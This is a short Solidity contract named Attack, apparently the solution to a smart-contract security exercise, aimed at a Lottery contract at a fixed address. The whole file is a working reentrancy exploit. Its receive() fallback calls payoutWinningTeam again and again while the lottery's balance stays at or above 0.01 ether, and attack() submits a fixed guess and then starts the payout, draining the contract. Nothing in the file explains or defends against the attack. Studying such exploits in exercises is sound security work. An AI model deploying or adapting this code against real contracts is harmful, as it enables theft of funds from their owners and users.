// SPDX-License-Identifier: None

pragma solidity 0.6.0;
import "./Lottery.sol";

contract Attack {
    uint256 number;

    Lottery lottery = Lottery(0xd9145CCE52D386f254917e481eB44e9943F39138);

    // Fallback is called when DepositFunds sends Ether to this contract.
    receive() external payable {
        if (address(lottery).balance >= .01 ether) {
            lottery.payoutWinningTeam(address(this));
        }
    }

    function attack() external payable {
        //lottery.registerTeam(address(this),"attacker","password");
        lottery.makeAGuess(address(this), 14);
        lottery.payoutWinningTeam(address(this));
    }
}
